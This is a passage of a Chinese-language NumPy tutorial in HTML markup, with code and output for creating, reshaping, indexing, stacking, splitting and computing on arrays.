dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int8<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 指定类型为int8  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([3, 4, 5, 6, 7], dtype=int8)  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 改变shape  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[ 0,  1,  2,  3],         [ 4,  5,  6,  7],         [ 8,  9, 10, 11]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 从1到2生成5个浮点数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([1.  , 1.25, 1.5 , 1.75, 2.  ])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 全0数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[0., 0., 0.],         [0., 0., 0.]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 全一数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1., 1., 1.],         [1., 1., 1.]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>eye<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 主对角线为一， 其他元素为0  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1., 0., 0.],         [0., 1., 0.],         [0., 0., 1.]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 生成[0, 1) 之间的随机浮点数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[0.05146009, 0.05024011, 0.67549961],         [0.3244844 , 0.24009114, 0.71975804]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 生成[0, 10) 之间的随机整数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[5, 7],         [1, 2],         [9, 7]])  </code></pre><h3 id="1-3-构建复杂数组"><a href="#1-3-构建复杂数组" class="headerlink" title="1.3 构建复杂数组"></a>1.3 构建复杂数组</h3><p>很多时候，我们需要从简单的数据结构，构造出复杂的数组。例如，用一维的数据生成二维的数据  </p><h4 id="1-3-1-重复数组：tile"><a href="#1-3-1-重复数组：tile" class="headerlink" title="1.3.1 重复数组：tile"></a>1.3.1 重复数组：tile</h4><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  a  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([0, 1, 2, 3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>tile<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([0, 1, 2, 3, 4, 0, 1, 2, 3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>tile<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[0, 1, 2, 3, 4, 0, 1, 2, 3, 4],         [0, 1, 2, 3, 4, 0, 1, 2, 3, 4],         [0, 1, 2, 3, 4, 0, 1, 2, 3, 4]])  </code></pre><h4 id="1-3-2-一维数组网格化：meshgrid"><a href="#1-3-2-一维数组网格化：meshgrid" class="headerlink" title="1.3.2 一维数组网格化：meshgrid"></a>1.3.2 一维数组网格化：meshgrid</h4><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>  np<span class="token punctuation">.</span>meshgrid<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>[array([[0, 1, 2, 3, 4],          [0, 1, 2, 3, 4],          [0, 1, 2, 3, 4],          [0, 1, 2, 3, 4],          [0, 1, 2, 3, 4]]), array([[5, 5, 5, 5, 5],          [6, 6, 6, 6, 6],          [7, 7, 7, 7, 7],          [8, 8, 8, 8, 8],          [9, 9, 9, 9, 9]])]  </code></pre><h4 id="1-3-3-指定范围和分割方式的网格化：mgrid"><a href="#1-3-3-指定范围和分割方式的网格化：mgrid" class="headerlink" title="1.3.3 指定范围和分割方式的网格化：mgrid"></a>1.3.3 指定范围和分割方式的网格化：mgrid</h4><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>mgrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2j</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">3j</span><span class="token punctuation">]</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[[0. , 0. , 0. ],          [1. , 1. , 1. ]],         [[1. , 1.5, 2. ],          [1. , 1.5, 2. ]]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>mgrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0.3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">0.4</span><span class="token punctuation">]</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[[0. , 0. , 0. ],          [0.3, 0.3, 0.3],          [0.6, 0.6, 0.6],          [0.9, 0.9, 0.9]],         [[1. , 1.4, 1.8],          [1. , 1.4, 1.8],          [1. , 1.4, 1.8],          [1. , 1.4, 1.8]]])  </code></pre><p>上述例子中用到了虚数。构造虚数的方法如下：  </p><pre class="line-numbers language-python"><code class="language-python">complex<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>(2+5j)  </code></pre><h3 id="1-4-数组的属性"><a href="#1-4-数组的属性" class="headerlink" title="1.4 数组的属性"></a>1.4 数组的属性</h3><p>numpy的数组除了一些常规的属性外，也有几个类似转置、扁平迭代器等看起来更像是方法的属性。扁平迭代器也许是遍历多为数组的一个简明方法，下面的代码给出了一个例子。  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  a<span class="token punctuation">.</span>dtype    <span class="token comment" spellcheck="true"># 数组元素的数据类型  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>dtype(&#39;int32&#39;)  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>dtype<span class="token punctuation">.</span>itemsize  <span class="token comment" spellcheck="true">#数组元素占据的内存字节数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>4  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>shape   <span class="token comment" spellcheck="true"># 数组的维度  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>(2, 3)  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>size <span class="token comment" spellcheck="true"># 数组元素的个数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>6  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>T   <span class="token comment" spellcheck="true"># 数组行变列，类似于矩阵的转置  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1, 4],         [2, 5],         [3, 6]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>flat <span class="token comment" spellcheck="true"># 返回一个扁平迭代器，用于遍历多维数组  </span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>flat<span class="token punctuation">)</span>  <span class="token keyword">for</span> item <span class="token keyword">in</span> a<span class="token punctuation">.</span>flat<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;numpy.flatiter object at 0x00000287DCA5DC60&gt;  1  2  3  4  5  6  </code></pre><h3 id="1-5-改变数组的维度"><a href="#1-5-改变数组的维度" class="headerlink" title="1.5 改变数组的维度"></a>1.5 改变数组的维度</h3><p>numpy数组的存储顺序和数组的维度是不相干的，一次改变数组的维度是非常便捷的操作，除resize()外，这一类操作不会改变所操作的数组本身的存储顺序。  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>shape<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 查看数组维度  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>(2, 3)  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 返回3行2列的数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1, 2],         [3, 4],         [5, 6]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>ravel<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 返回一维数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([1, 2, 3, 4, 5, 6])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 类似于reshape，但会改变所操作的数组  </span>a  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([[1, 2],         [3, 4],         [5, 6]])  </code></pre><h3 id="1-6-索引与切片"><a href="#1-6-索引与切片" class="headerlink" title="1.6 索引与切片"></a>1.6 索引与切片</h3><p>对于一维数组的索引和切片，numpy和python的list一样，甚至更灵活  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>  a<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#最后一个元素  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>8  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 返回第2到第5个元素  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([2, 3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 返回第0到第7个元素，步长为3  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([0, 3, 6])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 返回逆序数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([8, 7, 6, 5, 4, 3, 2, 1, 0])  </code></pre><p>假设有一栋2层楼，每层楼内的房间都是3排4列，那我们可以用一个三维数组来保存每个房间的居住人数（当然，也可以是房间面积等其他数值信息）。  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 2层3排4列  </span>a  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([[[ 0,  1,  2,  3],          [ 4,  5,  6,  7],          [ 8,  9, 10, 11]],         [[12, 13, 14, 15],          [16, 17, 18, 19],          [20, 21, 22, 23]]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>      <span class="token comment" spellcheck="true">#虽然可以这样  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>23  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 但这才是规范的用法  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>23  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#所有楼层的1排1列  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([ 0, 12])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#一楼所用房间，等价于a[0]或a[0,...]  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[ 0,  1,  2,  3],         [ 4,  5,  6,  7],         [ 8,  9, 10, 11]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#所有楼层所有排的第2到4列  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[[ 1,  2],          [ 5,  6],          [ 9, 10]],         [[13, 14],          [17, 18],          [21, 22]]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true"># 2层每一排的最后一个房间  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([15, 19, 23])  </code></pre><h3 id="1-7-数组合并"><a href="#1-7-数组合并" class="headerlink" title="1.7 数组合并"></a>1.7 数组合并</h3><p>数组合并触雷下面介绍的水平合并、垂直合并、深度合并外，还有行合并、列合并，以及concatenat()等方式。假如你比我还懒，那就只了解前三种方法，足够用了  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">a  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[0, 1, 2],         [3, 4, 5],         [6, 7, 8]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">b  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[ 9, 10, 11],         [12, 13, 14],         [15, 16, 17]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>hstack<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 水平合并  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[ 0,  1,  2,  9, 10, 11],         [ 3,  4,  5, 12, 13, 14],         [ 6,  7,  8, 15, 16, 17]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>vstack<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 垂直合并  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[ 0,  1,  2],         [ 3,  4,  5],         [ 6,  7,  8],         [ 9, 10, 11],         [12, 13, 14],         [15, 16, 17]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>dstack<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 深度合并  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[[ 0,  9],          [ 1, 10],          [ 2, 11]],         [[ 3, 12],          [ 4, 13],          [ 5, 14]],         [[ 6, 15],          [ 7, 16],          [ 8, 17]]])  </code></pre><h3 id="1-8-数组拆分"><a href="#1-8-数组拆分" class="headerlink" title="1.8 数组拆分"></a>1.8 数组拆分</h3><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>hsplit<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#水平拆分，返回list  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>[array([[0],          [3],          [6]]), array([[1],          [4],          [7]]), array([[2],          [5],          [8]])]  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>vsplit<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 垂直拆分，返回list  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>[array([[0, 1, 2]]), array([[3, 4, 5]]), array([[6, 7, 8]])]  </code></pre><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>  np<span class="token punctuation">.</span>dsplit<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#深度拆分，返回list  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[array([[[ 0],           [ 3],           [ 6]],          [[ 9],           [12],           [15]],          [[18],           [21],           [24]]]), array([[[ 1],           [ 4],           [ 7]],          [[10],           [13],           [16]],          [[19],           [22],           [25]]]), array([[[ 2],           [ 5],           [ 8]],          [[11],           [14],           [17]],          [[20],           [23],           [26]]])]  </code></pre><h3 id="1-9-数组运算"><a href="#1-9-数组运算" class="headerlink" title="1.9 数组运算"></a>1.9 数组运算</h3><p>数组和常数的四则运算，是数组的每一个元素分别和常数运算；数组和数组的四则运算则是两个数组对应元素的运算（两个数组有相同的shape，否则抛出异常）  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">+</span> <span class="token number">2</span>     <span class="token comment" spellcheck="true"># 数组和常数可以进行四则运算  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[2., 3.],         [4., 5.]], dtype=float32)  </code></pre><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">/</span> b    <span class="token comment" spellcheck="true"># 数组和数组可以进行四则运算  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[0.        , 0.2       ],         [0.33333334, 0.42857143]], dtype=float32)  </code></pre><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">==</span> b    <span class="token comment" spellcheck="true"># 最神奇的是， 数组可以判断对应元素是否相等  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[False, False],         [False, False]])  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">(</span>a <span class="token operator">==</span> b<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 判断数组是否相等  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>False  </code></pre><p><strong>特别提示</strong>：如果相对数组内符合特定条件的元素做特殊处理，下面的代码也许有用  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  a  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([[0, 1, 2],         [3, 4, 5]])  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>a<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[False, False, False],         [ True,  True, False]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token punctuation">(</span>a<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>a<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># a中满足条件的数组成的数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">[</span><span class="token punctuation">(</span>a<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span>  <span class="token comment" spellcheck="true"># 满足条件的进行后面的运算  </span>a  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([[ 0,  1,  2],         [13, 14,  5]])  </code></pre><h3 id="1-10-数组方法和常用函数"><a href="#1-10-数组方法和常用函数" class="headerlink" title="1.10 数组方法和常用函数"></a>1.10 数组方法和常用函数</h3><p>数组对象本身提供了计算算数平均值、求最大值最小值等内置方法，numpy也提供了很多实用的函数。为了缩减篇幅，下面的代码仅以一维数组为例，展示了这些方法和函数的用法。事实上，大多是情况下这些方法和函数对于多维数组同样有效，只有少数例外，比如compress函数。  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 所有元素之和  </span><span aria-hidden="true" 